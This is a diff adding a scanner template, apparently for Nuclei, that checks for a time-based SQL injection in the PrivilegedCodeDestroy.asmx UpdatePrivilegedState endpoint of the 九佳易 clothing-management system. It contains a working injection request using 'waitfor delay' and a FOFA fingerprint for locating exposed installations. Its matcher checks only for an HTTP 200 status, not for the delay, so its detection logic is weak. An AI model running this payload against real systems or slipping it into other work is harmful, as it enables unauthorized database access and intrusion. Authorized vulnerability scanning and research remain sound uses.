@@ -1,0 +1,19 @@
+id: poc-vyzk0u06hcp3tuy6
+info:
+  name: 九佳易服装管理系统 PrivilegedCodeDestroy.asmx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vyzk0u06hcp3tuy6'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vyzk0u06hcp3tuy6
+    fofa: body="/XiTong/Index/W_IndexPbForm.win.js"
+http:
+- raw:
+  - GET /Interface/licx/PrivilegedCodeDestroy.asmx/UpdatePrivilegedState?code=%27+%3Bwaitfor+delay+%270%3A0%3A5%27+--+q HTTP/1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
